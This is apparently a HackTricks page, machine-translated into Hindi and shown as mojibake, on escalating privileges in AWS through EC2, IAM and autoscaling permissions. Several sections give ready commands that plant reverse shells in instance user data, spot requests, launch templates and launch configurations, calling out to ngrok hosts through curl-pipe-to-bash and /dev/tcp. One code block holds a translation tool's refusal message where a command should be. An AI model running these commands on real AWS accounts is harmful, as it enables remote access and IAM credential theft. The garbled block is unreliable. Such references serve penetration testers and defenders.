# AWS - EC2 Privesc

<details>

<summary><strong>рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛ рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) **рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВ**.
* **рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ.

</details>

## EC2

рдЕрдзрд┐рдХ **рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП EC2** рджреЗрдЦреЗрдВ:

{% content-ref url="../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/" %}
[aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum](../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/)
{% endcontent-ref %}

### `iam:PassRole`, `ec2:RunInstances`

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ **рдПрдХ IAM рд░реЛрд▓ рдХреЛ рдЕрдЯреИрдЪ рдХрд░рдХреЗ рдПрдХ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рддрдХ рдкрд╣реБрдВрдЪ рдХрд░** рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдПрдВрдбрдкреЙрдЗрдВрдЯ рд╕реЗ IAM рд░реЛрд▓ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдЪреБрд░рд╛ рд╕рдХрддрд╛ рд╣реИред

* **SSH рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрд╣реБрдВрдЪ**

рдПрдХ рдирдпрд╛ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдЪрд▓рд╛рдПрдВ рдЬрд┐рд╕рдореЗрдВ рдПрдХ **рдмрдирд╛рдпрд╛ рдЧрдпрд╛** **ssh рдХреА** (`--key-name`) рд╣реЛ рдФрд░ рдлрд┐рд░ рдЙрд╕рдореЗрдВ ssh рдХрд░реЗрдВ (рдпрджрд┐ рдЖрдк рдПрдХ рдирдпрд╛ рдмрдирд╛рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ рдЖрдкрдХреЛ `ec2:CreateKeyPair` рдХреА рдЕрдиреБрдорддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИ)ред
```bash
aws ec2 run-instances --image-id <img-id> --instance-type t2.micro \
--iam-instance-profile Name=<instance-profile-name> --key-name <ssh-key> \
--security-group-ids <sg-id>
```
* **рдпреВрдЬрд░ рдбреЗрдЯрд╛ рдореЗрдВ rev shell рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрд╣реБрдБрдЪ**

рдЖрдк рдПрдХ рдирдпрд╛ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ **рдпреВрдЬрд░ рдбреЗрдЯрд╛** (`--user-data`) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдкрдХреЛ рдПрдХ **rev shell** рднреЗрдЬрд╛ рдЬрд╛рдПрдЧрд╛ред рдЗрд╕ рддрд░реАрдХреЗ рд╕реЗ рдЖрдкрдХреЛ рд╕рд┐рдХреНрдпреЛрд░рд┐рдЯреА рдЧреНрд░реБрдк рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИред
```bash
echo '#!/bin/bash
curl https://reverse-shell.sh/4.tcp.ngrok.io:17031 | bash' > /tmp/rev.sh

aws ec2 run-instances --image-id <img-id> --instance-type t2.micro \
--iam-instance-profile Name=E<instance-profile-name> \
--count 1 \
--user-data "file:///tmp/rev.sh"
```
рдпрджрд┐ рдЖрдк IAM рд░реЛрд▓ рдХреА рд╕рд╛рдЦ рдХрд╛ рдЙрдкрдпреЛрдЧ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЗ рдмрд╛рд╣рд░ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ GuradDuty рдХреЗ рд╕рд╛рде рд╕рд╛рд╡рдзрд╛рди рд░рд╣реЗрдВ:

{% content-ref url="../aws-services/aws-security-and-detection-services/aws-guardduty-enum.md" %}
[aws-guardduty-enum.md](../aws-services/aws-security-and-detection-services/aws-guardduty-enum.md)
{% endcontent-ref %}

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдХрд┐рд╕реА рднреА EC2 рд░реЛрд▓ рдХреЗ рд▓рд┐рдП рд╕реАрдзреЗ рдкреНрд░рд┐рд╡реЗрд╕реНрдХ рдЬреЛ рдореМрдЬреВрджрд╛ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкреНрд░реЛрдлрд╛рдЗрд▓реНрд╕ рд╕реЗ рдЬреБрдбрд╝рд╛ рд╣реБрдЖ рд╣реИред

#### ECS рдХреЗ рд▓рд┐рдП рдкреНрд░рд┐рд╡реЗрд╕реНрдХ

рдЗрд╕ рд╕реЗрдЯ рдСрдл рдкрд░рдорд┐рд╢рдиреНрд╕ рдХреЗ рд╕рд╛рде рдЖрдк **рдПрдХ EC2 рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реЗ рдПрдХ ECS рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рдЕрдВрджрд░ рд░рдЬрд┐рд╕реНрдЯрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред рдЗрд╕ рддрд░рд╣, ECS **рд╕рд░реНрд╡рд┐рд╕реЗрдЬ** рдЙрд╕ **EC2 рдЗрдВрд╕реНрдЯреЗрдВрд╕** рдХреЗ рдЕрдВрджрд░ **рдЪрд▓рд╛рдИ рдЬрд╛рдПрдВрдЧреА** рдЬрд╣рд╛рдВ рдЖрдкрдХреА рдкрд╣реБрдВрдЪ рд╣реИ рдФрд░ рдлрд┐рд░ рдЖрдк рдЙрди рд╕рд░реНрд╡рд┐рд╕реЗрдЬ (рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░реНрд╕) рдХреЛ рдкреНрд░рд╡реЗрд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рдЙрдирдХреЗ ECS рд░реЛрд▓реНрд╕ рдЪреБрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред

{% code overflow="wrap" %}
```bash
aws ec2 run-instances \
--image-id ami-07fde2ae86109a2af \
--instance-type t2.micro \
--iam-instance-profile <ECS_role> \
--count 1 --key-name pwned \
--user-data "file:///tmp/asd.sh"

# Make sure to use an ECS optimized AMI as it has everything installed for ECS already (amzn2-ami-ecs-hvm-2.0.20210520-x86_64-ebs)
# The EC2 instance profile needs basic ECS access
# The content of the user data is:
#!/bin/bash
echo ECS_CLUSTER=<cluster-name> >> /etc/ecs/ecs.config;echo ECS_BACKEND_HOST= >> /etc/ecs/ecs.config;
```
{% endcode %}

рдирдП EC2 рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдореЗрдВ **ECS рд╕реЗрд╡рд╛рдУрдВ рдХреЛ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░рдиреЗ** рдХреА рд╡рд┐рдзрд┐ рд╕реАрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ:

{% content-ref url="aws-ecs-privesc.md" %}
[aws-ecs-privesc.md](aws-ecs-privesc.md)
{% endcontent-ref %}

рдпрджрд┐ рдЖрдк **рдирдпрд╛ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдирд╣реАрдВ рдмрдирд╛ рд╕рдХрддреЗ** рд▓реЗрдХрд┐рди рдЖрдкрдХреЗ рдкрд╛рд╕ `ecs:RegisterContainerInstance` рдЕрдиреБрдорддрд┐ рд╣реИ, рддреЛ рдЖрдк рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рдЕрдВрджрд░ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЛ рд░рдЬрд┐рд╕реНрдЯрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЯрд┐рдкреНрдкрдгреА рдХрд┐рдП рдЧрдП рд╣рдорд▓реЗ рдХреЛ рдЕрдВрдЬрд╛рдо рджреЗ рд╕рдХрддреЗ рд╣реИрдВред

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** ECS рд░реЛрд▓реНрд╕ рдХреЗ рд▓рд┐рдП рд╕реАрдзрд╛ рдкреНрд░рд┐рд╡реЗрд╕реНрдХ рдЬреЛ рдЯрд╛рд╕реНрдХреНрд╕ рд╕реЗ рдЬреБрдбрд╝реЗ рд╣реЛрддреЗ рд╣реИрдВред

### **`iam:PassRole`,** **`iam:AddRoleToInstanceProfile`**

рдкрд┐рдЫрд▓реЗ рдкрд░рд┐рджреГрд╢реНрдп рдХреЗ рд╕рдорд╛рди, рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рд╡рд╛рд▓рд╛ рд╣рдорд▓рд╛рд╡рд░ **рд╕рдордЭреМрддрд╛ рдХрд┐рдП рдЧрдП рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЗ IAM рд░реЛрд▓ рдХреЛ рдмрджрд▓ рд╕рдХрддрд╛ рд╣реИ** рддрд╛рдХрд┐ рд╡рд╣ рдирдИ рд╕рд╛рдЦ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХреЗред\
рдЪреВрдВрдХрд┐ рдПрдХ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкреНрд░реЛрдлрд╛рдЗрд▓ рдореЗрдВ рдХреЗрд╡рд▓ 1 рд░реЛрд▓ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкреНрд░реЛрдлрд╛рдЗрд▓ рдореЗрдВ **рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдПрдХ рд░реЛрд▓ рд╣реИ** (рд╕рд╛рдорд╛рдиреНрдп рдорд╛рдорд▓рд╛), рддреЛ рдЖрдкрдХреЛ **`iam:RemoveRoleFromInstanceProfile`** рдХреА рднреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреАред

{% code overflow="wrap" %}
```bash
# Removing role from instance profile
aws iam remove-role-from-instance-profile --instance-profile-name <name> --role-name <name>

# Add role to instance profile
aws iam add-role-to-instance-profile --instance-profile-name <name> --role-name <name>
```
{% endcode %}

рдпрджрд┐ **instance profile рдореЗрдВ рдПрдХ role рд╣реИ** рдФрд░ рд╣рдорд▓рд╛рд╡рд░ **рдЗрд╕реЗ рд╣рдЯрд╛ рдирд╣реАрдВ рд╕рдХрддрд╛**, рддреЛ рдПрдХ рдФрд░ рдЙрдкрд╛рдп рд╣реИред рд╡рд╣ **рдПрдХ instance profile рдвреВрдВрдв рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдХреЛрдИ role рдирд╣реАрдВ рд╣реИ** рдпрд╛ **рдирдпрд╛ рдПрдХ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ** (`iam:CreateInstanceProfile`), **role рдХреЛ рдЙрд╕ instance profile рдореЗрдВ рдЬреЛрдбрд╝ рд╕рдХрддрд╛ рд╣реИ** (рдЬреИрд╕рд╛ рдХрд┐ рдкрд╣рд▓реЗ рдЪрд░реНрдЪрд╛ рдХреА рдЧрдИ рдереА), рдФрд░ **instance profile рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд┐рдП рдЧрдП instance рд╕реЗ рдЬреЛрдбрд╝ рд╕рдХрддрд╛ рд╣реИ:**

* рдпрджрд┐ instance рдореЗрдВ **рдХреЛрдИ instance profile рдирд╣реАрдВ рд╣реИ** (`ec2:AssociateIamInstanceProfile`) \*

{% code overflow="wrap" %}
```bash
aws ec2 associate-iam-instance-profile --iam-instance-profile Name=<value> --instance-id <value>
```
{% endcode %}

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдПрдХ рдЕрд▓рдЧ EC2 рднреВрдорд┐рдХрд╛ рдХреЗ рд▓рд┐рдП рд╕реАрдзрд╛ privesc (рдЖрдкрдХреЛ рдПрдХ AWS EC2 рдЙрджрд╛рд╣рд░рдг рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдФрд░ рдХреБрдЫ рдЕрддрд┐рд░рд┐рдХреНрдд рдЕрдиреБрдорддрд┐ рдпрд╛ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЙрджрд╛рд╣рд░рдг рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рд╕реНрдерд┐рддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА)ред

### **`iam:PassRole`((** `ec2:AssociateIamInstanceProfile`& `ec2:DisassociateIamInstanceProfile`) || `ec2:ReplaceIamInstanceProfileAssociation`)

рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдЙрджрд╛рд╣рд░рдг рд╕реЗ рдЬреБрдбрд╝реА рдЙрджрд╛рд╣рд░рдг рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рдХреЛ рдмрджрд▓рд╛ рдЬрд╛ рд╕рдХреЗ, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдкрд╛рд╕ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдПрдХ рдЙрджрд╛рд╣рд░рдг рддрдХ рдкрд╣реБрдБрдЪ рд╣реИ рддреЛ рд╡рд╣ рдЗрд╕рд╕реЗ рдЬреБрдбрд╝реА рднреВрдорд┐рдХрд╛ рдХреЛ рдмрджрд▓рдХрд░ рдЕрдзрд┐рдХ рдЙрджрд╛рд╣рд░рдг рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рднреВрдорд┐рдХрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдкреНрд░рдорд╛рдг-рдкрддреНрд░ рдЪреБрд░рд╛ рд╕рдХрддрд╛ рд╣реИред

* рдпрджрд┐ рдЗрд╕рдореЗрдВ **рдПрдХ рдЙрджрд╛рд╣рд░рдг рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рд╣реИ**, рддреЛ рдЖрдк рдЙрджрд╛рд╣рд░рдг рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рдХреЛ **рд╣рдЯрд╛** рд╕рдХрддреЗ рд╣реИрдВ (`ec2:DisassociateIamInstanceProfile`) рдФрд░ рдЗрд╕реЗ **рдЬреЛрдбрд╝** рд╕рдХрддреЗ рд╣реИрдВ \*

{% code overflow="wrap" %}
```bash
aws ec2 describe-iam-instance-profile-associations --filters Name=instance-id,Values=i-0d36d47ba15d7b4da
aws ec2 disassociate-iam-instance-profile --association-id <value>
aws ec2 associate-iam-instance-profile --iam-instance-profile Name=<value> --instance-id <value>
```
{% endcode %}

* рд╕рдордЭреМрддрд╛ рдХрд┐рдП рдЧрдП instance рдХреА **instance profile** рдХреЛ **рдмрджрд▓реЗрдВ** (`ec2:ReplaceIamInstanceProfileAssociation`). \*

{% code overflow="wrap" %}
````
```bash
The provided text is a command and does not contain any prose to translate. It is a specific AWS CLI command used for replacing an IAM instance profile association in EC2, and as per your instructions, commands should not be translated. If you need translation for any other text or explanations, please provide the text.
```
````
{% endcode %}

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдПрдХ рдЕрд▓рдЧ EC2 рднреВрдорд┐рдХрд╛ рдХреЗ рд▓рд┐рдП рд╕реАрдзрд╛ privesc (рдЖрдкрдХреЛ рдПрдХ AWS EC2 рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдФрд░ рдХреБрдЫ рдЕрддрд┐рд░рд┐рдХреНрдд рдЕрдиреБрдорддрд┐ рдпрд╛ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкреНрд░реЛрдлрд╛рдЗрд▓ рд╕реНрдерд┐рддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА)ред

### `ec2:RequestSpotInstances`,`iam:PassRole`

рдЬрд┐рдирдХреЗ рдкрд╛рд╕ **`ec2:RequestSpotInstances` рдФрд░ `iam:PassRole`** рдЕрдиреБрдорддрд┐рдпрд╛рдВ рд╣реИрдВ, рд╡реЗ рдПрдХ **Spot Instance** рдХрд╛ **рдЕрдиреБрд░реЛрдз** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ рдПрдХ **EC2 Role рд╕рдВрд▓рдЧреНрди** рд╣реЛрддреА рд╣реИ рдФрд░ **user data** рдореЗрдВ рдПрдХ **rev shell** рд╣реЛрддрд╛ рд╣реИред\
рдПрдХ рдмрд╛рд░ рдЬрдм рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдЪрд▓рдирд╛ рд╢реБрд░реВ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ, рд╡рд╣ **IAM рднреВрдорд┐рдХрд╛ рдЪреБрд░рд╛** рд╕рдХрддрд╛ рд╣реИред

{% code overflow="wrap" %}
```bash
REV=$(printf '#!/bin/bash
curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | bash
' | base64)

aws ec2 request-spot-instances \
--instance-count 1 \
--launch-specification "{\"IamInstanceProfile\":{\"Name\":\"EC2-CloudWatch-Agent-Role\"}, \"InstanceType\": \"t2.micro\", \"UserData\":\"$REV\", \"ImageId\": \"ami-0c1bc246476a5572b\"}"
```
{% endcode %}

### `ec2:ModifyInstanceAttribute`

**`ec2:ModifyInstanceAttribute`** рдХреЗ рд╕рд╛рде рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЗ рдЧреБрдгреЛрдВ рдХреЛ рдмрджрд▓ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рдореЗрдВ, рд╡рд╣ **рдпреВрдЬрд░ рдбреЗрдЯрд╛ рдмрджрд▓ рд╕рдХрддрд╛ рд╣реИ**, рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╡рд╣ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЛ **рдордирдорд╛рдирд╛ рдбреЗрдЯрд╛ рдЪрд▓рд╛рдиреЗ** рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ **EC2 рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдореЗрдВ рд░реЗрд╡ рд╢реЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЧреБрдгреЛрдВ рдХреЛ рдХреЗрд╡рд▓ рддрдм **рдмрджрд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрдм рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдмрдВрдж рд╣реЛ**, рдЗрд╕рд▓рд┐рдП **рдЕрдиреБрдорддрд┐рдпрд╛рдБ** **`ec2:StopInstances`** рдФрд░ **`ec2:StartInstances`** рднреА рдЬрд░реВрд░реА рд╣реИрдВред
```bash
TEXT='Content-Type: multipart/mixed; boundary="//"
MIME-Version: 1.0

--//
Content-Type: text/cloud-config; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="cloud-config.txt"

#cloud-config
cloud_final_modules:
- [scripts-user, always]

--//
Content-Type: text/x-shellscript; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="userdata.txt"

#!/bin/bash
bash -i >& /dev/tcp/2.tcp.ngrok.io/14510 0>&1
--//'
TEXT_PATH="/tmp/text.b64.txt"

printf $TEXT | base64 > "$TEXT_PATH"

aws ec2 stop-instances --instance-ids $INSTANCE_ID

aws ec2 modify-instance-attribute \
--instance-id="$INSTANCE_ID" \
--attribute userData \
--value file://$TEXT_PATH

aws ec2 start-instances --instance-ids $INSTANCE_ID
```
**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдХрд┐рд╕реА рднреА EC2 IAM рднреВрдорд┐рдХрд╛ рдХреЗ рд╕рд╛рде рдЬреБрдбрд╝реЗ рдмрдирд╛рдП рдЧрдП рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рд╕реАрдзрд╛ privescред

### `ec2:CreateLaunchTemplateVersion`,`ec2:CreateLaunchTemplate`,`ec2:ModifyLaunchTemplate`

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ **`ec2:CreateLaunchTemplateVersion`,`ec2:CreateLaunchTemplate` рдФрд░ `ec2:ModifyLaunchTemplate`** рдХреА рдЕрдиреБрдорддрд┐рдпрд╛рдВ рд╣реИрдВ, рд╡рд╣ **рдирдпрд╛ Launch Template рд╕рдВрд╕реНрдХрд░рдг** рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ **user data рдореЗрдВ rev shell** рдФрд░ **рдХреЛрдИ рднреА EC2 IAM рднреВрдорд┐рдХрд╛** рд╣реЛ, рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕рдВрд╕реНрдХрд░рдг рдмрджрд▓ рд╕рдХрддрд╛ рд╣реИ, рдФрд░ **рдХреЛрдИ рднреА Autoscaler рд╕рдореВрд╣** рдЬреЛ рдЙрд╕ **Launch Template** рдХрд╛ **рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ** рдФрд░ **рдирд╡реАрдирддрдо** рдпрд╛ **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕рдВрд╕реНрдХрд░рдг** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдХреЙрдиреНрдлрд╝рд┐рдЧрд░** рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рд╡рд╣ рдЙрд╕ рдЯреЗрдореНрдкреНрд▓реЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрджрд╛рд╣рд░рдгреЛрдВ рдХреЛ **рдкреБрдирдГ рдЪрд▓рд╛рдПрдЧрд╛** рдФрд░ rev shell рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧрд╛ред

{% code overflow="wrap" %}
```bash
REV=$(printf '#!/bin/bash
curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | bash
' | base64)

aws ec2 create-launch-template-version \
--launch-template-name bad_template \
--launch-template-data "{\"ImageId\": \"ami-0c1bc246476a5572b\", \"InstanceType\": \"t3.micro\", \"IamInstanceProfile\": {\"Name\": \"ecsInstanceRole\"}, \"UserData\": \"$REV\"}"

aws ec2 modify-launch-template \
--launch-template-name bad_template \
--default-version 2
```
{% endcode %}

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдПрдХ рдЕрд▓рдЧ EC2 рднреВрдорд┐рдХрд╛ рдХреЗ рд▓рд┐рдП рд╕реАрдзрд╛ privescред

### `autoscaling:CreateLaunchConfiguration`,`autoscaling:CreateAutoScalingGroup`,`iam:PassRole`

рдЬрд┐рди рд╣рдорд▓рд╛рд╡рд░реЛрдВ рдХреЗ рдкрд╛рд╕ **`autoscaling:CreateLaunchConfiguration`,`autoscaling:CreateAutoScalingGroup`,`iam:PassRole`** рдЕрдиреБрдорддрд┐рдпрд╛рдВ рд╣реЛрддреА рд╣реИрдВ, рд╡реЗ **Launch Configuration рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдЬрд┐рд╕рдореЗрдВ рдПрдХ **IAM Role** рдФрд░ **user data** рдореЗрдВ рдПрдХ **rev shell** рд╣реЛрддрд╛ рд╣реИ, рдлрд┐рд░ рдЙрд╕ рдХреЙрдиреНрдлрд╝рд┐рдЧ рд╕реЗ рдПрдХ **autoscaling group рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ rev shell рдХреЗ рд▓рд┐рдП рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ **IAM Role рдЪреБрд░рд╛ рд╕рдХреЗрдВ**ред
```bash
aws --profile "$NON_PRIV_PROFILE_USER" autoscaling create-launch-configuration \
--launch-configuration-name bad_config \
--image-id ami-0c1bc246476a5572b \
--instance-type t3.micro \
--iam-instance-profile EC2-CloudWatch-Agent-Role \
--user-data "$REV"

aws --profile "$NON_PRIV_PROFILE_USER" autoscaling create-auto-scaling-group \
--auto-scaling-group-name bad_auto \
--min-size 1 --max-size 1 \
--launch-configuration-name bad_config \
--desired-capacity 1 \
--vpc-zone-identifier "subnet-e282f9b8"
```
**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдПрдХ рдЕрд▓рдЧ EC2 рднреВрдорд┐рдХрд╛ рдХреЗ рд▓рд┐рдП рд╕реАрдзрд╛ privescред

### `!autoscaling`

рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рд╕реЗрдЯ **`ec2:CreateLaunchTemplate`** рдФрд░ **`autoscaling:CreateAutoScalingGroup`** **рдкрд░реНрдпрд╛рдкреНрдд рдирд╣реАрдВ рд╣реИрдВ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдПрд╕реНрдХрд▓реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП** рдХреНрдпреЛрдВрдХрд┐ рд▓реЙрдиреНрдЪ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдпрд╛ рд▓реЙрдиреНрдЪ рдЯреЗрдореНрдкреНрд▓реЗрдЯ рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рднреВрдорд┐рдХрд╛ рдХреЛ рдЬреЛрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП **рдЖрдкрдХреЛ рдЕрдиреБрдорддрд┐рдпрд╛рдБ `iam:PassRole` рдФрд░ `ec2:RunInstances` рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ** (рдЬреЛ рдХрд┐ рдПрдХ рдЬреНрдЮрд╛рдд privesc 